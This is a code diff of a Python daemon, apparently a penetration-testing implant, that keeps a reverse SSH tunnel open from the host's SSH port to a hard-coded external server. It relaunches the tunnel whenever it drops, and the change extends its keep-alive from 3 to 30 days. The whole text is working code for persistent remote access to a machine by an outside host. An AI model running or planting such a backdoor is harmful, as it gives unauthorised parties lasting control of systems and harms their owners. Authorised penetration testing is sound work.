@@ -11,12 +11,12 @@ import logging
 import subprocess
 import os
 
-PORT = 5522
+RPORT = 5522
 SERVER="45.76.173.191"
-SLEEP = 2
+SLEEP = 15
 USER = "pentester"
-DAYS = 3
-COMMAND = ["ssh", "-N", "-R", str(PORT) + ":localhost:" + "22", "-o", "ServerAliveInterval=60", "-o", "ServerAliveCountMax=" + str(DAYS*24*60), USER + "@" + SERVER]
+DAYS = 30
+COMMAND = ["ssh", "-C", "-N", "-R", str(RPORT) + ":localhost:" + "22", "-o", "ServerAliveInterval=60", "-o", "ServerAliveCountMax=" + str(DAYS*24*60), USER + "@" + SERVER]
 LOG_PATH = "/tmp/rsshd.log"
 
 def isOpen(ip,port):
@@ -31,7 +31,7 @@ def isOpen(ip,port):
 def daemon():
     while True:
         time.sleep(SLEEP)
-        if isOpen(SERVER, PORT) == False:
+        if isOpen(SERVER, RPORT) == False:
             log_to_file("No existe SSH reverso activo")
             try:
                 log_to_file("Iniciando SSH reverso")
